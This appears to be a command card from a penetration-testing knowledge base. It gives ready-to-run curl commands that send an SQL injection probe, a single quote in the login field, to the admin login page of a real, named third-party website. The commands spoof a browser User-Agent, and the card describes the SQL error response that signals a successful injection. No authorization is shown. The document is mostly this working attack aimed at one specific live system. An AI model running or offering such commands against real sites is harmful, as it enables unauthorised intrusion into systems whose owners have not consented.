---
id: cmd-uuid-1
data: >-
  curl -X POST https://mtngbissau.com/webadmin/index.php -H "Content-Type:
  application/x-www-form-urlencoded" -H "User-Agent: Mozilla/5.0 (X11; Linux
  x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" -d "login=user'&pass=uesse"
tags:
  - sqli
  - testing
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T03:46:26.139Z'
verified: false
validated: true
submitted: true
---
# manual-sqli-test-post

## Command

```bash
curl -X POST https://mtngbissau.com/webadmin/index.php \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" \
  -d "login=user'&pass=uesse"
```

## Description

This curl command sends a POST request to test for SQL injection in the admin login form by injecting a single quote in the 'login' parameter, attempting to break the SQL query syntax.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies POST method | Yes |
| `-H "Content-Type: ..."` | Sets form-encoded content type | Yes |
| `-H "User-Agent: ..."` | Mimics browser headers | No |
| `-d "login=...&pass=..."` | Payload data with injection | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://example.com/login.php -d "login=user'&pass=test"
```

### Advanced Usage

```bash
curl -X POST https://mtngbissau.com/webadmin/index.php \
  -H "Cookie: PHPSESSID=abc123" \
  -d "login=user'&pass=uesse"
```

## Expected Output

HTTP response (e.g., 200 OK) with body containing SQL error like "You have an error in your SQL syntax" or unexpected page content indicating successful injection.

## Related

- [[Related Procedure|procedures/Manual-SQL-Injection-Testing-in-Login-Form]]
